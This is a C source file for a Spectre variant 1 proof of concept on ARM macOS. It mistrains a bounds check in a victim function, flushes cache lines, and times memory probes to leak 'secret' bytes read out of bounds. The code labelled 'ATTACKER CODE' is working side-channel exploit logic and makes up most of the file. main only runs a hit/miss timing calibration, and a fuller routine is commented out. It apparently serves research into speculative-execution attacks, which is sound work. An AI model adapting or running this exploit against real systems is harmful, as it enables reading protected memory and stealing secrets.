#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>

#include <string.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <_types/_uint32_t.h>

#include "./utils.c"
#include "./spectre.h"

#define MAX_LINES 5000000
#define MAX_LINE_LENGTH 100

// pointer to public data. Public data is directly followed by secret.
char * array1 = NULL;
// array accessed by victim depending on value read relative to array1.
char * array2 = NULL;
// size of array1.
size_t* array_size = NULL;

// victim function.
void victim(size_t offset){
    int shift = (offset % OFFSETS_PER_BYTE) * BITS;
    size_t index = offset / OFFSETS_PER_BYTE;
    if(index < *array_size){
        memory_access(&array2[((array1[index] >> shift) & (VALUES - 1)) * ENTRY_SIZE]); 
    }
}

// Note: must serialize with isb and dsb ish
inline __attribute__((always_inline)) void clflush(void *ptr)
{
    asm volatile("dc civac, %0" : : "r"(ptr) : "memory");
}

inline __attribute__((always_inline))
uint64_t rdtsc()
{
    uint64_t ts;
    asm volatile("dsb ish");
    asm volatile("isb");
    asm volatile("mrs %0, S3_2_c15_c0_0" : "=r"(ts) : :);
    asm volatile("isb");
    return ts;
}

inline __attribute__((always_inline)) uint64_t probe(void *ptr)
{
    uint64_t start = rdtsc();
    memory_access(ptr);
    uint64_t end = rdtsc();
    return end - start;
}

// --------- SETUP CODE -----------

// cache removal contexts for array2
// cache_ctx_t * array2_ctx = NULL;

// offset used for training (part of nullbyte of public data)
size_t training_offset;

int setup(char* public_data, char* secret_data){
    if(array1) {
        free(array1);
    }
    if(!array2) {
        array2 = malloc(ENTRY_SIZE * VALUES);    
    }
    if(!array2){
        fprintf(stderr, "malloc of array2 with size %d failed (%d entries of size %d)\n", ENTRY_SIZE * VALUES, VALUES, ENTRY_SIZE);
        return 1;
    }
    
    array1 = malloc(strlen(public_data) + 1  /* nullbyte */ + strlen(secret_data) + 1 /* nullbyte */);
    
    if(!array1){
        fprintf(stderr, "malloc of array1 with size %zu failed\n", strlen(public_data) + strlen(secret_data) + 2);
        free(array2);
        array2 = NULL;
        return 1;
    }
    
    if(!array_size){
        array_size = malloc(sizeof(size_t));
        
        if(!array_size){
            fprintf(stderr, "malloc of array_size with size %zu failed\n", sizeof(size_t));
            free(array2);
            array2 = NULL;
            free(array1);
            array1 = NULL;
            return 1;
        }
    }
    
    *array_size = strlen(public_data) + 1 /* nullbyte */;
    
    strcpy(array1, public_data);
    strcpy(array1 + *array_size, secret_data);
    
    // if(!array2_ctx){
    //     array2_ctx = malloc(sizeof(cache_ctx_t) * (VALUES + 1 /* array_size */));
        
    //     if(!array2_ctx){
    //         fprintf(stderr, "malloc of array2_ctx with size %zu failed\n", sizeof(cache_ctx_t) * (VALUES + 1 /* array_size */));
    //         free(array2);
    //         array2 = NULL;
    //         free(array1);
    //         array1 = NULL;
    //         free(array_size);
    //         array_size = NULL;
    //         return 1;
    //     }
        
    //     for(int i = 0; i < VALUES; i++){
    //         array2_ctx[i] = cache_remove_prepare(&array2[i * ENTRY_SIZE]);
    //     }
        
    //     array2_ctx[VALUES] = cache_remove_prepare((char*)(void*)array_size);
    // }
    
    training_offset = (*array_size - 1) * OFFSETS_PER_BYTE;
    
    return 0;
}

// --------- ATTACKER CODE -----------

int leakValue(size_t leak_offset){
    // array used to record amount of cache hits for each entry of array2
    static int cache_hits[VALUES];
    for(int i = 0; i < VALUES; i++){
        cache_hits[i] = 0;
    }
   
    /* 
     * collect data
     */
     
    for(int iteration = 0; iteration < ITERATIONS; iteration++){ // do ITERATIONS measurements
   
        // // cache_remove(array2)
        // for(int i = 0; i < VALUES; i++){
        //     cache_remove(array2_ctx[i]);
        // }
   
        // // make sure everything is really removed from cache
        // memory_fence();
    
        // mistrain + access out of bounds
     
        for(int i = VICTIM_CALLS; i >= 0; i--){ // do VICTIM_CALLS calls to the victim function (per measurement)
            
            // in-bounds or out of bounds
            // this is leak_offset every TRAINING + 1 iterations and training_offset otherwise
            // we try to avoid branches, so it is written that way.
            size_t x = (!(i % (TRAINING + 1))) * (leak_offset - training_offset) + training_offset;
            
            // remove array_size from cache
            clflush(array_size);
            // cache_remove(array2_ctx[VALUES]);
            
            // call to vulnerable function.
            // Either training (in-bound) or attack (out-of-bound) call.
            // If this is an attack call and the mistraining was successful, an entry of array2 will be cached
            //  directly dependend on the entry in array1 we want to leak!
            victim(x);
            
        }
        
        // measurement
        
        // measure access time to each entry in array2.
        // increment cache_hits at the corresponding position on cache hit.
        uint64_t time;
        #if VERBOSITY > 2
            printf("timings for offset %zu:\n", leak_offset);
        #endif /* VERBOSITY */
        
        for(int i = 0; i < VALUES; i++){ // for each offset in array2
            // measure time
            time = probe(&array2[i * ENTRY_SIZE]);
            #if VERBOSITY > 2
                printf("%d: %" PRId64 "\n", i, time);
            #endif /* VERBOSITY */
            // increment cache_hits on cache hit
            cache_hits[i] += (time < THRESHOLD) && time; // && time makes sure the time wasn't 0 (0 = the timer is not running)
        }
        
        #if VERBOSITY > 2
            fflush(stdout);
        #endif /* VERBOSITY */
    }
    
    /*
     * interpret collected data
     */
    #if VERBOSITY > 1
        printf("cache hits for index %zu:\n", leak_offset);
        for(int i = 0; i < VALUES; i++){
            printf("%d: %d\n", i, cache_hits[i]);
        }
    #endif /* VERBOSITY */
    
    // best offset
    // note: if we don't find a better one, it will stay 0
    int best = 0;
    // amount of cache hits for best offset
    int best_count = 0;
 
    // check if there is a better offset than 0
    for(int i = 1; i < VALUES; i++){ // for each entry of cache_hits excluding entry 0
        // if this offset has more cache hits than the current best, it becomes the new best
        if(cache_hits[i] > best_count){
            best = i;
            best_count = cache_hits[i];
        }
    }
    
    // return offset of array2 with most cache hits 
    // (should be the value read from out-of-bound access to array1 during mis-speculation)
    return best;
}

int leakByte(size_t leak_index){
    size_t leak_offset = leak_index * OFFSETS_PER_BYTE;
    
    // leak all indices that make up byte and reconstruct byte
    int result = 0;
    for(int i = OFFSETS_PER_BYTE - 1; i >= 0; i--){
        result <<= BITS;
        result |= leakValue(leak_offset + i);
    }
    
    // return reconstructed byte
    return result;
}

int main() {
    uint32_t CORE_ID = 3;
    volatile uint32_t ret = sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t));
    if (ret == -1)
    {
        printf("Error setting CPU core affinity. Please run as root\n");
        return EXIT_FAILURE;
    }
    
    uint32_t size;
    probe(&size);
    uint64_t a = probe(&size);
    clflush(&size);
    uint64_t b = probe(&size);

    printf("Hit test - %llu\nMiss test - %llu\n", a, b);
            
    // /*********** Spectre ************/
    // int n_train = 10;
    // int n = 0;
    // // Flush the Probe array
    // memset(array, 0, sizeof(array));
    // for (size_t i = 0; i < 256; i++) {
    //     clflush(array + i * 4096);
    // }
    
    // // Mistrain
    // for(size_t i=0; i<n_train; i++){
    //         // flush(&size);
    //         victim(i);
    // }

    // // Reading out-of-bound value
    // clflush(&size);
    // victim(public[n++ + 6]);

    // // Recover the secret
    // uint64_t timings[256];
    // for(size_t i = 0; i < 256; i++){
    //     timings[i] = probe((char *)array+4096 *i);
    // }

    // // Record byte value that hits in the cache
    // // EXCEPT for 0xff (which is the dummy value).
    // for (int j = 0; j < 256; ++j)
    // {
    //     printf("[%d] %llu\n", j, timings[j]);
    // }
    // /*********** Spectre ************/

    return 0;
}
